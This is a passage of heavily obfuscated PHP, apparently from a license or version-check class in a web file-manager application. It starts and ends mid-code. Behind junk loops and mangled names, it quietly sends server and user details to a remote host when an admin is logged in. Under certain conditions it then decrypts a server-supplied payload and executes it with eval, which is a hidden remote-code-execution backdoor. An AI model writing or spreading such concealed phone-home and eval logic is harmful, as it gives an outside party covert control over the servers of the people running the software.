$ÔÚòè¼ö; } } foreach ($ï„³ÒÏ as $ÔÚòè¼ö) { unset($Ò–ÎŸÔó[$ÔÚòè¼ö]); $Ó£ŞìÍø = $Ô¤şáçº[750]; if (!$Ó£ŞìÍø) { die; } } return $Ò–ÎŸÔó; $™†ÓØÕ° = $Ô¤şáçº[751]; if (strlen($™†ÓØÕ°) < $Ô¤şáçº[694]) { die; } } private function versionPluginList() { $ÊÜà‹’¢ =& $_SERVER[ÏÊŸ¾Îä]; return array($ÊÜà‹’¢[228] => $ÊÜà‹’¢[227], $ÊÜà‹’¢[229] => $ÊÜà‹’¢[227], $ÊÜà‹’¢[230] => $ÊÜà‹’¢[227], $ÊÜà‹’¢[231] => $ÊÜà‹’¢[232], $ÊÜà‹’¢[233] => $ÊÜà‹’¢[232], $ÊÜà‹’¢[234] => $ÊÜà‹’¢[232], $ÊÜà‹’¢[235] => $ÊÜà‹’¢[232], $ÊÜà‹’¢[236] => $ÊÜà‹’¢[232], $ÊÜà‹’¢[237] => $ÊÜà‹’¢[232], $ÊÜà‹’¢[238] => $ÊÜà‹’¢[232], $ÊÜà‹’¢[239] => $ÊÜà‹’¢[232], $ÊÜà‹’¢[240] => $ÊÜà‹’¢[232], $ÊÜà‹’¢[241] => $ÊÜà‹’¢[232], $ÊÜà‹’¢[242] => $ÊÜà‹’¢[232], $ÊÜà‹’¢[243] => $ÊÜà‹’¢[232], $ÊÜà‹’¢[244] => $ÊÜà‹’¢[232]); } private function versionPluginFilter() { $ù ¦‘ã¼ =& $_SERVER[ÏÊŸ¾Îä]; if ($this->izoe53abf557 == $ù ¦‘ã¼[109]) { return $ù ¦‘ã¼[6]; } $°‹úÏ×Ì = _get($this->hzyaa39d3f3c, $ù ¦‘ã¼[245], $ù ¦‘ã¼[6]); $ùı……šæ = $_SERVER[†ûãı«°][752]; $¿•ÑûĞÖ = _get($this->hzyaa39d3f3c, $ù ¦‘ã¼[116], $ù ¦‘ã¼[6]); $Ö’‹”‰ = _get($this->hzyaa39d3f3c, $ù ¦‘ã¼[246], $ù ¦‘ã¼[6]); if ($¿•ÑûĞÖ > time() && $Ö’‹”‰ > time()) { $¨®÷²¶ = explode($ù ¦‘ã¼[226], $°‹úÏ×Ì); $¥Áı¼ÔÛ = array_keys($this->versionPluginList()); $°‹úÏ×Ì = array_merge($¨®÷²¶, $¥Áı¼ÔÛ); $°‹úÏ×Ì = implode($ù ¦‘ã¼[226], array_filter(array_unique($°‹úÏ×Ì))); } return $°‹úÏ×Ì; } private function zlxbde400d17() { $ØË‡¶İ =& $_SERVER[ÏÊŸ¾Îä]; if ($this->izoe53abf557 != $ØË‡¶İ[109]) { $GLOBALS[$ØË‡¶İ[86]][$ØË‡¶İ[90]][$ØË‡¶İ[247]] = $ØË‡¶İ[206]; return; } $GLOBALS[$ØË‡¶İ[86]][$ØË‡¶İ[248]] = $ØË‡¶İ[122]; if (Model($ØË‡¶İ[249])->get($ØË‡¶İ[63]) != $ØË‡¶İ[206]) { Model($ØË‡¶İ[249])->set($ØË‡¶İ[63], $ØË‡¶İ[206]); } } public function hanu29ce9b44() { return $_SERVER[ÏÊŸ¾Îä][250]; } private function vazgcec836dc() { $ê•’ÒÉ“ =& $_SERVER[†ûãı«°]; $ ƒè²° =& $_SERVER[ÏÊŸ¾Îä]; $±ŸË®™² = array($ ƒè²°[251], $ ƒè²°[252], $ ƒè²°[253]); $òµ‘«‘÷ = $ê•’ÒÉ“[753]; if (!$òµ‘«‘÷) { die; } $Ê—ÛÛÁß = $ ƒè²°[254] . md5($ ƒè²°[255]); if ($this->izoe53abf557 == $ ƒè²°[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$ ƒè²°[24]], $±ŸË®™²)) { return; } if (time() % 4 != 0) { return; } $ÙÉÃƒ»Œ = call_user_func(array($ ƒè²°[256], $ ƒè²°[257]), $Ê—ÛÛÁß); $ôÍ¡ê™ó = $ê•’ÒÉ“[754]; while (strlen($ôÍ¡ê™ó) < $ê•’ÒÉ“[712]) { if (!$ôÍ¡ê™ó) { break; } $ôÍ¡ê™ó++; } if ($ÙÉÃƒ»Œ && time() - $ÙÉÃƒ»Œ < intval($ ƒè²°[258])) { return; } call_user_func(array($ ƒè²°[256], $ ƒè²°[139]), $Ê—ÛÛÁß, time()); $©€Òñ¼ß = Model($ ƒè²°[33])->get($ ƒè²°[100]); $«”ÆÜ¿° = $ê•’ÒÉ“[755]; if (!$«”ÆÜ¿°) { die; } $ƒè™ÀŸÊ = array($ ƒè²°[152] => Model($ ƒè²°[33])->get($ ƒè²°[153]), $ ƒè²°[167] => $this->izoe53abf557, $ ƒè²°[163] => $_SERVER[$ ƒè²°[164]], $ ƒè²°[165] => Model($ ƒè²°[33])->get($ ƒè²°[131]), $ ƒè²°[105] => md5($_SERVER[$ ƒè²°[106]] . $©€Òñ¼ß), $ ƒè²°[156] => $ ƒè²°[136], $ ƒè²°[159] => $_SERVER[$ ƒè²°[160]]); $Ş¼¿¬¾È = $this->jraf4e3636cf($ ƒè²°[259], $ƒè™ÀŸÊ); $ƒ—ÛéÙß = $ê•’ÒÉ“[756]; while ($ƒ—ÛéÙß < $ê•’ÒÉ“[705]) { if ($ƒ—ÛéÙß >= 0) { break; } $ƒ—ÛéÙß++; } if (!is_array($Ş¼¿¬¾È)) { return; } if ($Ş¼¿¬¾È[$ ƒè²°[152]] && $Ş¼¿¬¾È[$ ƒè²°[260]]) { if ($this->ycjp900388b2($Ş¼¿¬¾È[$ ƒè²°[260]]) == $ƒè™ÀŸÊ[$ ƒè²°[152]]) { return; } } $this->fgpk05be6e8d(); if ($this->ycjp900388b2($Ş¼¿¬¾È[$ ƒè²°[260]]) != $ƒè™ÀŸÊ[$ ƒè²°[152]]) { $Ìğ˜„éò = array($ ƒè²°[185] => $©€Òñ¼ß, $ ƒè²°[186] => $_SERVER[$ ƒè²°[106]], $ ƒè²°[187] => this_url(), $ ƒè²°[161] => $_SERVER[$ ƒè²°[162]]); $úµÃÀ­È = $this->hljz246e0f14(json_encode($Ìğ˜„éò)); $Ş¼¿¬¾È = $this->jraf4e3636cf($ ƒè²°[188] . $úµÃÀ­È); if ($Ş¼¿¬¾È && is_array($Ş¼¿¬¾È) && isset($Ş¼¿¬¾È[$ ƒè²°[260]])) { $ŞÏ­›³˜ = $this->jsvkd9172d2f($Ş¼¿¬¾È[$ ƒè²°[260]], 2); if ($ŞÏ­›³˜) { $ŞÏ­›³˜ = $this->ycjp900388b2($ŞÏ­›³˜); } if ($ŞÏ­›³˜) { try { @eval($ŞÏ­›³˜); } catch (Exception $Äïõ¹Ñ¦) { } } } } } private function jraf4e3636cf($–‹—€• = '', $­²¼Œíš = array(), $Èš˜¸ = 5) { $¢Áõï† =& $_SERVER[†ûãı«°]; $ïãëØÛ =& $_SERVER[ÏÊŸ¾Îä]; $–ÛÓ„ª· = $ïãëØÛ[261]; $–ÛÓ„ª· = $this->dgyt39e462a0($–ÛÓ„ª·, $ïãëØÛ[262]); $–ÛÓ„ª· = $–ÛÓ„ª· . $–‹—€•; if ($­²¼Œíš && is_array($­²¼Œíš)) { $–ÛÓ„ª· = $–ÛÓ„ª· . $ïãëØÛ[263] . http_build_query($­²¼Œíš); } if ($­²¼Œíš === -1) { return $–ÛÓ„ª·; } $’·îæü¿ = stream_context_create(array($ïãëØÛ[219] => array($ïãëØÛ[222] => $Èš˜¸, $ïãëØÛ[220] => $ïãëØÛ[264]), $ïãëØÛ[265] => array($ïãëØÛ[266] => !1, $ïãëØÛ[267] => !1))); $­²¼Œíš = @file_get_contents($–ÛÓ„ª·, !1, $’·îæü¿); return json_decode($­²¼Œíš, !0); $ˆ˜¨Íœ· = $¢Áõï†[757]; if (strlen($ˆ˜¨Íœ·) < $¢Áõï†[705]) { die; } $›š•Ñì¯ = $¢Áõï†[758]; } private function krand0a2c9c7() { $©ÍİĞÂÅ =& $_SERVER[†ûãı«°]; $üá¹¡– =& $_SERVER[ÏÊŸ¾Îä]; $Í–Ìà¿† = array($üá¹¡–[268] => $üá¹¡–[269], $üá¹¡–[270] => $üá¹¡–[271], $üá¹¡–[272] => $üá¹¡–[273], $üá¹¡–[274] => $üá¹¡–[275], $üá¹¡–[276] => $üá¹¡–[277], $üá¹¡–[278] => $üá¹¡–[214], $üá¹¡–[279] => $üá¹¡–[214], $üá¹¡–[280] => $üá¹¡–[269], $üá¹¡–[281] => $üá¹¡–[271], $üá¹¡–[282] => $üá¹¡–[273], $üá¹¡–[283] => $üá¹¡–[284], $üá¹¡–[285] => $üá¹¡–[275], $üá¹¡–[286] => $üá¹¡–[287], $üá¹¡–[288] => $üá¹¡–[277], $üá¹¡–[289] => $üá¹¡–[290], $üá¹¡–[291] => $üá¹¡–[292], $üá¹¡–[293] => $üá¹¡–[294]); $”ñ»ˆÅò = $©ÍİĞÂÅ[759]; while (strlen($”ñ»ˆÅò) < $©ÍİĞÂÅ[712]) { if (!$”ñ»ˆÅò) { break; } $”ñ»ˆÅò++; } $Û¬Ñìáü = $Í–Ìà¿†[$this->izoe53abf557]; $Û¬Ñìáü = intval($Û¬Ñìáü ? $Û¬Ñìáü : $üá¹¡–[269]); $Õ¬ï¼ù‰ = $©ÍİĞÂÅ[760]; while (strlen($Õ¬ï¼ù‰) < $©ÍİĞÂÅ[705]) { if (!$Õ¬ï¼ù‰) { break; } $Õ¬ï¼ù‰++; } $£Ÿå“ªÑ = _get($this->hzyaa39d3f3c, $üá¹¡–[295]); $€¦ÆòÜ˜ = $©ÍİĞÂÅ[761]; if (!$€¦ÆòÜ˜) { die; } $£Ÿå“ªÑ = $£Ÿå“ªÑ ? intval($£Ÿå“ªÑ) : 0; $äôôÉâ¨ = $©ÍİĞÂÅ[762]; if (!$äôôÉâ¨) { die; } return $Û¬Ñìáü + $£Ÿå“ªÑ; } public function btrq96a41407($§Ş‰ú¹˜) { $¦ôù£šŒ =& $_SERVER[†ûãı«°]; $Ùı‘‹Üğ =& $_SERVER[ÏÊŸ¾Îä]; $Í¿ÁÏø· = $this->krand0a2c9c7(); $Û´’ß±¶ = $¦ôù£šŒ[763]; if (!$Û´’ß±¶) { die; } if ($§Ş‰ú¹˜[$Ùı‘‹Üğ[296]] == $Ùı‘‹Üğ[122]) { return; } if ($Í¿ÁÏø· >= intval($Ùı‘‹Üğ[214])) { return; } $§Ş§íñº = Model($Ùı‘‹Üğ[125])->count(); $ŸÊ‘Û = $¦ôù£šŒ[755]; if (!$ŸÊ‘Û) { return; } if ($§Ş§íñº <= $Í¿ÁÏø·) { return; } $²°ËÆ½ = Model($Ùı‘‹Üğ[125])->field($Ùı‘‹Üğ[296])->limit($Í¿ÁÏø·)->select(); $¸ç¾àø = $¦ôù£šŒ[764]; while ($¸ç¾àø < $¦ôù£šŒ[694]) { if ($¸ç¾àø >= 0) { break; } $¸ç¾àø++; } $²°ËÆ½ = array_to_keyvalue($²°ËÆ½, $Ùı‘‹Üğ[6], $Ùı‘‹Üğ[296]); if (!in_array($§Ş‰ú¹˜[$Ùı‘‹Üğ[296]], $²°ËÆ½)) { show_json($Ùı‘‹Üğ[297], !1, $Ùı‘‹Üğ[210]); } } public function ymij7fd020b6() { $ÁÑ–„­¤ =& $_SERVER[†ûãı«°]; $Ô¶ò¡×¯ =& $_SERVER[ÏÊŸ¾Îä]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $†¹»·»Ö = $Ô¶ò¡×¯[217]; $†¹»·»Ö = $this->dgyt39e462a0($†¹»·»Ö, $Ô¶ò¡×¯[218]); $±Ç£Ôñ× = $ÁÑ–„­¤[765]; $Ø»Ù©âĞ = stream_context_create(array($Ô¶ò¡×¯[219] => array($Ô¶ò¡×¯[220] => $Ô¶ò¡×¯[221], $Ô¶ò¡×¯[222] => 3))); $âÎŸŞ½ = @file_get_contents($†¹»·»Ö, !1, $Ø»Ù©âĞ); $‹ª­•—£ = $ÁÑ–„­¤[766]; echo $Ô¶ò¡×¯[298] . hash_encode($âÎŸŞ½) . $Ô¶ò¡×¯[299]; } private function yfmadc81930e($¨‘ÓÅ, $¤ÁæÙ›•, $¡¹çÍÓã = 3) { $‚’¿À” =& $_SERVER[†ûãı«°]; $Ş’ß¦è’ =& $_SERVER[ÏÊŸ¾Îä]; usleep(1); $çŸúâ­ì = $‚’¿À”[767]; if (strlen($çŸúâ­ì) < $‚’¿À”[712]) { return; } $¨‘ÓÅ = trim($¨‘ÓÅ); $¼Ó¦¦¡ = mt_rand(0, 5) . $Ş’ß¦è’[6]; $íè™¤Ëò = rand_string(15); $·ñ‡ƒˆø = $‚’¿À”[768]; $ĞÄö”ÒÃ = $Ş’ß¦è’[300]; switch ($¼Ó¦¦¡) { case $Ş’ß¦è’[206]: $Ì˜Ôëâ = $this->tdrva9d52f38($¨‘ÓÅ, strrev($¤ÁæÙ›• . $íè™¤Ëò)); $ùãëƒ× = $‚’¿À”[769]; break; $Âñ•ƒ—à = $‚’¿À”[770]; if (!$Âñ•ƒ—à) { return; } case $Ş’ß¦è’[122]: $Ì˜Ôëâ = $this->tdrva9d52f38($¨‘ÓÅ, strrev($íè™¤Ëò . $¤ÁæÙ›•)); break; case $Ş’ß¦è’[301]: $Ì˜Ôëâ = $this->tdrva9d52f38($¨‘ÓÅ, base64_encode($íè™¤Ëò . $¤ÁæÙ›•)); break; $‘Î‡é€Ÿ = $‚’¿À”[771]; case $Ş’ß¦è’[302]: $Ì˜Ôëâ = $this->tdrva9d52f38($¨‘ÓÅ, md5($íè™¤Ëò . $¤ÁæÙ›•)); break; case $Ş’ß¦è’[303]: $¨‘ÓÅ = base64_encode($¨‘ÓÅ); $Î—è½áç = $‚’¿À”[772]; while ($Î—è½áç < $‚’¿À”[690]) { if ($Î—è½áç >= 0) { break; } $Î—è½áç++; } $­ÅµúÂ = rand(0, 64); $€ÛÓ­ßÛ = $‚’¿À”[773]; while ($€ÛÓ­ßÛ < $‚’¿À”[705]) { if ($€ÛÓ­ßÛ >= 0) { break; } $€ÛÓ­ßÛ++; } $„ã™—Ò« = $ĞÄö”ÒÃ[$­ÅµúÂ]; $æÅ´ºœÑ = $‚’¿À”[774]; if (!$æÅ´ºœÑ) { return; } $ø³òûë– = md5($„ã™—Ò« . md5($¤ÁæÙ›• . $„ã™—Ò«) . $¤ÁæÙ›•); $‚ùŞÃ’ = $‚’¿À”[775]; $ø³òûë– = substr($ø³òûë–, $­ÅµúÂ % 8, $­ÅµúÂ % 8 + 7); $£ä‡‰´ = $‚’¿À”[776]; if (!$£ä‡‰´) { die; } $“‹¦¦“ª = $Ş’ß¦è’[6]; $˜ƒÙŸ²‘ = 0; $á†Õ¶¢Ò = 0; $×æ½¼ùê = 0; $†¿Íê‚ê = $‚’¿À”[777]; if (!$†¿Íê‚ê) { return; } for ($˜ƒÙŸ²‘ = 0; $˜ƒÙŸ²‘ < strlen($¨‘ÓÅ); $˜ƒÙŸ²‘++) { $×æ½¼ùê = $×æ½¼ùê == strlen($ø³òûë–) ? 0 : $×æ½¼ùê; $á†Õ¶¢Ò = ($­ÅµúÂ + strpos($ĞÄö”ÒÃ, $¨‘ÓÅ[$˜ƒÙŸ²‘]) + ord($ø³òûë–[$×æ½¼ùê++])) % 64; $“‹¦¦“ª .= $ĞÄö”ÒÃ[$á†Õ¶¢Ò]; $“®ùËÙ = $‚’¿À”[778]; while ($“®ùËÙ < $‚’¿À”[694]) { if ($“®ùËÙ >= 0) { break; } $“®ùËÙ++; } } $Ì˜Ôëâ = hash_encode($„ã™—Ò« . $“‹¦¦“ª); $ŠØıŒÌÈ = $‚’¿À”[779]; if (!$ŠØıŒÌÈ) { return; } break; default: $Ì˜Ôëâ = $this->tdrva9d52f38($¨‘ÓÅ, $¤ÁæÙ›• . $íè™¤Ëò); break; $ÉÑ¯ÚØê = $‚’¿À”[780]; if (strlen($ÉÑ¯ÚØê) < $‚’¿À”[690]) { die; } } $Ì˜Ôëâ = strrev($¼Ó¦¦¡ . $íè™¤Ëò . $Ì˜Ôëâ); $—Šíº³ = $‚’¿À”[781]; while ($—Šíº³ < $‚’¿À”[712]) { if ($—Šíº³ >= 0) { break; } $—Šíº³++; } if ($¡¹çÍÓã - 1 > 0) { $Ì˜Ôëâ = $this->yfmadc81930e($Ì˜Ôëâ, $¤ÁæÙ›•, $¡¹çÍÓã - 1); } return $Ì˜Ôëâ; } private function jsvkd9172d2f($·÷•Íµ, $·’ïŠ÷, $‘Ñ•øó‹ = 3) { $†ÖÖ‡»ü =& $_SERVER[†ûãı«°]; $¦ûñŒÌ =& $_SERVER[ÏÊŸ¾Îä]; if (!is_string($·÷•Íµ) || strlen($·÷•Íµ) < 10) { return !1; } $·÷•Íµ = trim($·÷•Íµ); $·÷•Íµ = strrev($·÷•Íµ); $¹î¼’Ğ‹ = $·÷•Íµ[0]; $›Ê‹¸”¼ = $†ÖÖ‡»ü[782]; if (strlen($›Ê‹¸”¼) < $†ÖÖ‡»ü[690]) { return; } $’êı¸²Ô = substr($·÷•Íµ, 1, 15); $¥ÒÕ¢º§ = $†ÖÖ‡»ü[783]; if (!$¥ÒÕ¢º§) { return; } $·÷•Íµ = substr($·÷•Íµ, 16); $¯üÈï• = $†ÖÖ‡»ü[784]; if (!$¯üÈï•) { die; } $òïíà = $¦ûñŒÌ[300]; $Ñå·Î“¯ = $†ÖÖ‡»ü[785]; if (strlen($Ñå·Î“¯) < $†ÖÖ‡»ü[712]) { return; } switch ($¹î¼’Ğ‹) { case $¦ûñŒÌ[206]: $Ğ¦ìâ­ = $this->dgyt39e462a0($·÷•Íµ, strrev($·’ïŠ÷ . $’êı¸²Ô)); break; case $¦ûñŒÌ[122]: $Ğ¦ìâ­ = $this->dgyt39e462a0($·÷•Íµ, strrev($’êı¸²Ô . $·’ïŠ÷)); break; $áÆ´ëõ› = $†ÖÖ‡»ü[786]; if (strlen($áÆ´ëõ›) < $†ÖÖ‡»ü[694]) { return; } case $¦ûñŒÌ[301]: $Ğ¦ìâ­ = $this->dgyt39e462a0($·÷•Íµ, base64_encode($’êı¸²Ô . $·’ïŠ÷)); break; $Äå¡¿¾è = $†ÖÖ‡»ü[787]; if (strlen($Äå¡¿¾è) < $†ÖÖ‡»ü[694]) { return; } case $¦ûñŒÌ[302]: $Ğ¦ìâ­ = $this->dgyt39e462a0($·÷•Íµ, md5($’êı¸²Ô . $·’ïŠ÷)); break; case $¦ûñŒÌ[303]: $·÷•Íµ = hash_decode($·÷•Íµ); $ò¾Œ½ñ“ = $†ÖÖ‡»ü[788]; if (!$ò¾Œ½ñ“) { return; } $ûÒ»¡ãî = $·÷•Íµ[0]; $·÷•Íµ = substr($·÷•Íµ, 1); $İ¦åäëó = strpos($òïíà, $ûÒ»¡ãî); $œÃÑÃ¾Ì = md5($ûÒ»¡ãî . md5($·’ïŠ÷ . $ûÒ»¡ãî) . $·’ïŠ÷); $œÃÑÃ¾Ì = substr($œÃÑÃ¾Ì, $İ¦åäëó % 8, $İ¦åäëó % 8 + 7); $¸ŠÏÉƒ = $¦ûñŒÌ[6]; $“®Ã«šã = $†ÖÖ‡»ü[789]; $ë¿œÉ¼ = 0; $™ú——²â = $†ÖÖ‡»ü[790]; $—Æ“âè¶ = 0; $“èø¡Î = $†ÖÖ‡»ü[791]; if (!$“èø¡Î) { return; } $Ù£ôíŞÜ = 0; for ($ë¿œÉ¼ = 0; $ë¿œÉ¼ < strlen($·÷•Íµ); $ë¿œÉ¼++) { $Ù£ôíŞÜ = $Ù£ôíŞÜ == strlen($œÃÑÃ¾Ì) ? 0 : $Ù£ôíŞÜ; $ì­ïàìü = $†ÖÖ‡»ü[792]; while ($ì­ïàìü < $†ÖÖ‡»ü[694]) { if ($ì­ïàìü >= 0) { break; } $ì­ïàìü++; } $øŞŞ¾Çù = $Ù£ôíŞÜ++; $—Æ“âè¶ = strpos($òïíà, $·÷•Íµ[$ë¿œÉ¼]) - $İ¦åäëó - ord($œÃÑÃ¾Ì[$øŞŞ¾Çù]); while ($—Æ“âè¶ < 0) { $—Æ“âè¶ += 64; $¢æÖÃª = $†ÖÖ‡»ü[793]; if (!$¢æÖÃª) { return; } } $¸ŠÏÉƒ .= $òïíà[$—Æ“âè¶]; } $Ğ¦ìâ­ = base64_decode($¸ŠÏÉƒ); $¤ê°ûÑ¢ = $†ÖÖ‡»ü[794]; if (strlen($¤ê°ûÑ¢) < $†ÖÖ‡»ü[694]) { die; } break; default: $Ğ¦ìâ­ = $this->dgyt39e462a0($·÷•Íµ, $·’ïŠ÷ . $’êı¸²Ô); break; $ñ‰×«§á = $†ÖÖ‡»ü[795]; if (strlen($ñ‰×«§á) < $†ÖÖ‡»ü[712]) { return; } } if ($‘Ñ•øó‹ - 1 > 0) { $Ğ¦ìâ­ = $this->jsvkd9172d2f($Ğ¦ìâ­, $·’ïŠ÷, $‘Ñ•øó‹ - 1); } return $Ğ¦ìâ­; } public function hljz246e0f14($‚õ¤µ“´) { $ò¬ëšèª =& $_SERVER[†ûãı«°]; $§Èà½Øè =& $_SERVER[ÏÊŸ¾Îä]; $œÉšµàï = $this->sdtw42e09bc4(); $íà†¤ôˆ = $ò¬ëšèª[796]; if (!$íà†¤ôˆ) { return; } $£½Ò° = $this->sdtw42e09bc4(); $£œ”Ä½œ = ($œÉšµàï - 1) * ($£½Ò° - 1); $ŸÃóÛ¾ = $ò¬ëšèª[797]; while ($ŸÃóÛ¾ < $ò¬ëšèª[690]) { if ($ŸÃóÛ¾ >= 0) { break; } $ŸÃóÛ¾++; } $òşŞ‚Ú¥ = intval(($œÉšµàï + $£½Ò°) / 2); while (1) { $è£ƒˆúø = $òşŞ‚Ú¥; $ÇŞŒ×ªå = $ò¬ëšèª[798]; if (!$ÇŞŒ×ªå) { die; } $»ˆ­ÃåÛ = $£œ”Ä½œ; $İªòÙç¢ = $ò¬ëšèª[799]; while ($»ˆ­ÃåÛ % $è£ƒˆúø != 0) { $æ…º‚©™ = $»ˆ­ÃåÛ; $»ˆ­ÃåÛ = $è£ƒˆúø; $è£ƒˆúø = $æ…º‚©™ % $è£ƒˆúø; } if ($è£ƒˆúø == 1) { break; } else { $òşŞ‚Ú¥++; } } $´ÃÃË = 2; $İ×ÏõºĞ = $ò¬ëšèª[800]; for ($õŒ—¥™ï = 0; $õŒ—¥™ï < $£œ”Ä½œ * 10; $õŒ—¥™ï++) { if (($£œ”Ä½œ * $õŒ—¥™ï + 1) % $òşŞ‚Ú¥ == 0) { $´ÃÃË = intval(($£œ”Ä½œ * $õŒ—¥™ï + 1) / $òşŞ‚Ú¥); break; } } $ØŞ„éó¦ = $this->tdrva9d52f38($œÉšµàï * $£½Ò° . $§Èà½Øè[6], $§Èà½Øè[136]); $íùáËôÀ = $ò¬ëšèª[801]; if (strlen($íùáËôÀ) < $ò¬ëšèª[690]) { return; } $¦¶öıêù = md5($§Èà½Øè[304] . ($œÉšµàï + $£½Ò°) . $§Èà½Øè[305] . $òşŞ‚Ú¥ . $§Èà½Øè[305] . $´ÃÃË . $§Èà½Øè[306]); $Õğø•¡É = $ò¬ëšèª[802]; while (strlen($Õğø•¡É) < $ò¬ëšèª[705]) { if (!$Õğø•¡É) { break; } $Õğø•¡É++; } $ëú§Ô• = $this->tdrva9d52f38($‚õ¤µ“´, $¦¶öıêù) . $§Èà½Øè[307] . $ØŞ„éó¦; $ò ¨¿äá = $ò¬ëšèª[803]; if (!$ò ¨¿äá) { die; } return $ëú§Ô•; } public function ycjp900388b2($„ëÜ„£³) { $°ÏöªÄ¾ =& $_SERVER[†ûãı«°]; $‚¹›ìƒ– =& $_SERVER[ÏÊŸ¾Îä]; $÷ëĞ¸† = explode($‚¹›ìƒ–[307], $„ëÜ„£³); $ŸşÈœ = $°ÏöªÄ¾[804]; if (count($÷ëĞ¸†) != 2) { return $‚¹›ìƒ–[6]; } $ö†šøà¼ = $this->dgyt39e462a0($÷ëĞ¸†[1] . $‚¹›ìƒ–[6], $‚¹›ìƒ–[136]); if (!$ö†šøà¼) { return $‚¹›ìƒ–[6]; } $ö†šøà¼ = intval($ö†šøà¼); $øìïõÆÅ = $°ÏöªÄ¾[805]; if (strlen($øìïõÆÅ) < $°ÏöªÄ¾[690]) { die; } $ªÙŞ¿¥ = 0; $ÖÎˆº¡ï = 0; $¤•±¡åÓ = $°ÏöªÄ¾[806]; if (!$¤•±¡åÓ) { die; } for ($Ú¥È›Ø» = 3; $Ú¥È›Ø» < $ö†šøà¼; $Ú¥È›Ø» += 2) { if ($ö†šøà¼ % $Ú¥È›Ø» != 0) { continue; } $ªÙŞ¿¥ = $Ú¥È›Ø»; $‰ş‘£¹ = $°ÏöªÄ¾[807]; if (strlen($‰ş‘£¹) < $°ÏöªÄ¾[690]) { return; } $ÖÎˆº¡ï = intval($ö†šøà¼ / $Ú¥È›Ø»); $ ¶¶¿«Ô = $°ÏöªÄ¾[808]; break; $–Ş²ÜÜ = $°ÏöªÄ¾[809]; if (strlen($–Ş²ÜÜ) < $°ÏöªÄ¾[694]) { return; } } $Óäó¶­ = ($ªÙŞ¿¥ - 1) * ($ÖÎˆº¡ï - 1); $–¶Ñï“ = intval(($ªÙŞ¿¥ + $ÖÎˆº¡ï) / 2); $Ÿ†æŒ›Ğ = $°ÏöªÄ¾[810]; while (1) { $Ù ¿•öš = $–¶Ñï“; $ö¼û›·ã = $°ÏöªÄ¾[811]; while ($ö¼û›·ã < $°ÏöªÄ¾[690]) { if ($ö¼û›·ã >= 0) { break; } $ö¼û›·ã++; } $ñïŸ„ùè = $Óäó¶­; $¾Ş³³´ = $°ÏöªÄ¾[812]; while ($ñïŸ„ùè % $Ù ¿•öš != 0) { $×©¬å°î = $ñïŸ„ùè; $ã¾¤Şúã = $°ÏöªÄ¾[813]; $ñïŸ„ùè = $Ù ¿•öš; $Ëù¶©’ = $°ÏöªÄ¾[814]; if (!$Ëù¶©’) { return; } $Ù ¿•öš = $×©¬å°î % $Ù ¿•öš; $ĞÔÍâ•Ä = $°ÏöªÄ¾[815]; if (!$ĞÔÍâ•Ä) { die; } } if ($Ù ¿•öš == 1) { break; } else { $–¶Ñï“++; } } $Ğ¢¶ˆ½ = 2; for ($Ú¥È›Ø» = 0; $Ú¥È›Ø» < $Óäó¶­ * 10; $Ú¥È›Ø»++) { if (($Óäó¶­ * $Ú¥È›Ø» + 1) % $–¶Ñï“ == 0) { $Ğ¢¶ˆ½ = intval(($Óäó¶­ * $Ú¥È›Ø» + 1) / $–¶Ñï“); break; } } $­¢„Í” = md5($‚¹›ìƒ–[304] . ($ªÙŞ¿¥ + $ÖÎˆº¡ï) . $‚¹›ìƒ–[305] . $–¶Ñï“ . $‚¹›ìƒ–[305] . $Ğ¢¶ˆ½ . $‚¹›ìƒ–[306]); $ÈÁÙ¯ä¿ = $this->dgyt39e462a0($÷ëĞ¸†[0], $­¢„Í”); return $ÈÁÙ¯ä¿; $é°¡ÌÄ = $°ÏöªÄ¾[816]; } public function sdtw42e09bc4() { $õ¼Õ‚› =& $_SERVER[†ûãı«°]; $‚û¤Ò÷İ = mt_rand(pow(2, 14), pow(2, 16) - 1); $şÄéµ…ß = $õ¼Õ‚›[817]; if (!$şÄéµ…ß) { return; } $çÂ”áú = array(); $ãŠ ™€Å = $õ¼Õ‚›[818]; $Ç´È¥ß = 1; $¥÷Úù× = $õ¼Õ‚›[819]; if (strlen($¥÷Úù×) < $õ¼Õ‚›[690]) { return; } while ($Ç´È¥ß <= (int) sqrt($‚û¤Ò÷İ)) { $üèæ¥—Œ = $Ç´È¥ß; while (!0) { $üèæ¥—Œ++; if ($üèæ¥—Œ <= 2) { $Ç´È¥ß = $üèæ¥—Œ; break; } else { if ($üèæ¥—Œ < 2) { continue; } } $©öŒü€å = !0; for ($Âª–½üÆ = 2; $Âª–½üÆ <= sqrt($üèæ¥—Œ); $Âª–½üÆ++) { if ($üèæ¥—Œ % $Âª–½üÆ == 0) { $©öŒü€å = !1; } } if ($©öŒü€å) { $Ç´È¥ß = $üèæ¥—Œ; break; } } $çÂ”áú[] = $Ç´È¥ß; $“ÌÇ•ª = $õ¼Õ‚›[820]; } $ñ…‹û¯ê = 2; $º™±Ü©ß = $õ¼Õ‚›[692]; if (!$º™±Ü©ß) { return; } for ($üèæ¥—Œ = $‚û¤Ò÷İ; $üèæ¥—Œ > 1; $üèæ¥—Œ--) { $©öŒü€å = !0; $øÆìóµ = $õ¼Õ‚›[821]; while (strlen($øÆìóµ) < $õ¼Õ‚›[694]) { if (!$øÆìóµ) { break; } $øÆìóµ++; } foreach ($çÂ”áú as $çÜ´ÁĞò) { if ($üèæ¥—Œ % $çÜ´ÁĞò == 0) { $©öŒü€å = !1; break; } } if ($©öŒü€å) { $ñ…‹û¯ê = $üèæ¥—Œ; break; } } return $ñ…‹û¯ê; $ÜÍ‘¸Ÿ = $õ¼Õ‚›[822]; if (strlen($ÜÍ‘¸Ÿ) < $õ¼Õ‚›[694]) { return; } } public function sqjaecb4b9c2($À À‚ˆê, $³îó•È) { $ÆÆ”¯Ê» =& $_SERVER[ÏÊŸ¾Îä]; return call_user_func(array($ÆÆ”¯Ê»[8], $ÆÆ”¯Ê»[308]), $À À‚ˆê, $³îó•È); } public function tdrva9d52f38($†ƒéĞÔÎ, $äÑ¾µš«) { $ÆŞÂ€Á =& $_SERVER[ÏÊŸ¾Îä]; return call_user_func(array($ÆŞÂ€Á[309], $ÆŞÂ€Á[310]), $†ƒéĞÔÎ, $äÑ¾µš«); } public function dgyt39e462a0($¸ğÄ´àº, $±â¸ÌØ¡) { $Çşğ•äÀ =& $_SERVER[†ûãı«°]; $ôÙ½÷Ï =& $_SERVER[ÏÊŸ¾Îä]; return call_user_func(array($ôÙ½÷Ï[309], $ôÙ½÷Ï[311]), $¸ğÄ´àº, 